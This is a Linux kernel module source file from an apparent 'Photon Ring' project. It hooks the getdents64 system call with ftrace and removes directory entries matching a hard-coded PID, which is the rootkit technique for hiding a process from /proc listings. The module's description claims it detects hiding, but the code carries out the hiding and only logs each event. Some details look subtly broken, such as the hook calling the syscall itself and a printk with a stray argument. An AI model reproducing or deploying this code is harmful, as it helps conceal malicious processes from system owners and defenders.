#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/ftrace.h>
#include <linux/string.h>
#include <linux/sched.h>
#include "../include/photon_ring_arch.h"
#include "../include/hiding_directory.h"


#define HIDE_PID "1234"
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Dustin");
MODULE_DESCRIPTION("Detect hiding directory behavior");
MODULE_VERSION("1.0");

static struct ftrace_ops ops;

/* linux_dirent64 definition (if not already defined) */
struct linux_dirent64
{
    u64 d_ino;
    s64 d_off;
    unsigned short d_reclen;
    unsigned char d_type;
    char d_name[];
};

static asmlinkage long (*original_getdents64)(
    unsigned int,
    struct linux_dirent64 __user *,
    unsigned int);

/* ============================= */
/*         FTRACE HOOK           */
/* ============================= */

static notrace void hook_getdents64(unsigned long ip,
                                    unsigned long parent_ip,
                                    struct ftrace_ops *ops,
                                    struct ftrace_regs *fregs)
{
    struct linux_dirent64 __user *dirent;
    unsigned int fd;
    unsigned int count;
    long ret;

    struct linux_dirent64 *kdirent, *d, *prev = NULL;
    unsigned long offset = 0;

    /* Extract arguments using Photon macro */
    fd = (unsigned int)PHOTON_RING_GET_ARG(fregs, 0);
    dirent = (struct linux_dirent64 __user *)
        PHOTON_RING_GET_ARG(fregs, 1);
    count = (unsigned int)PHOTON_RING_GET_ARG(fregs, 2);

    /* Call original syscall */
    ret = original_getdents64(fd, dirent, count);
    if (ret <= 0)
        return;

    /* Allocate kernel buffer */
    kdirent = kzalloc(ret, GFP_KERNEL);
    if (!kdirent)
        return;

    if (copy_from_user(kdirent, dirent, ret))
    {
        kfree(kdirent);
        return;
    }

    /* Iterate through directory entries */
    while (offset < ret)
    {
        d = (void *)kdirent + offset;

        if (strcmp(d->d_name, HIDE_PID) == 0)
        {

            printk(KERN_ALERT "[PHOTON RING] Hiding PID: %s\n",
                   d->d_name);

            /* Log hide event */
            photon_log_event(
                PHOTON_EVENT_DIR_HIDE,
                PHOTON_DETECTOR_DIRECTORY,
                d->d_name,
                strlen(d->d_name));

            if (d == kdirent)
            {
                ret -= d->d_reclen;
                memmove(d, (void *)d + d->d_reclen, ret);
                continue;
            }
            else
            {
                prev->d_reclen += d->d_reclen;
            }
        }
        else
        {
            prev = d;
        }

        offset += d->d_reclen;
    }

    copy_to_user(dirent, kdirent, ret);
    kfree(kdirent);

    /* Override return value */
    PHOTON_RING_SET_RETURN(fregs, ret);
}

/* ============================= */
/*            INIT               */
/* ============================= */

int hiding_directory_init(void)
{
    unsigned long addr;
    int ret;
    int hooks_installed = 0;

    printk(KERN_INFO "[PHOTON RING] initializing directory hider...\n");

    addr = (unsigned long)__x64_sys_getdents64;
    original_getdents64 = (void *)addr;

    // printk(KERN_INFO "[PHOTON RING] found getdents64 at: %lx\n", addr);

    ops.func = hook_getdents64;
    ops.flags = PHOTON_RING_FTRACE_FLAGS;

    ret = ftrace_set_filter_ip(&ops, addr, 0, 0);
    if (ret)
    {
        printk(KERN_ERR "[PHOTON RING] failed to set filter: %d\n", ret);
        return ret;
    }
    if (!ret)
    {
        ret = register_ftrace_function(&ops);
        if (!ret)
        {
            hooks_installed++;
        }
    }
    if (ret)
    {
        printk(KERN_ERR "[PHOTON RING] failed to register ftrace hook: %d\n", ret);
        ftrace_set_filter_ip(&ops, addr, 1, 0);
        return ret;
    }
    if (hooks_installed == 0)
    {
        printk(KERN_ERR "[PHOTON RING] Failed to install getdents64 hook!\n");
        return -ENOENT;
    }
    printk(KERN_INFO "[PHOTON RING] successfully hooked getdents64\n",hooks_installed);
    return 0;
}

/* ============================= */
/*            EXIT               */
/* ============================= */

void hiding_directory_exit(void)
{
    printk(KERN_INFO "[PHOTON RING] removing directory hider...\n");

    unregister_ftrace_function(&ops);
    ftrace_set_filter_ip(&ops, 0, 1, 0);

    printk(KERN_INFO "[PHOTON RING] directory hider removed\n");
}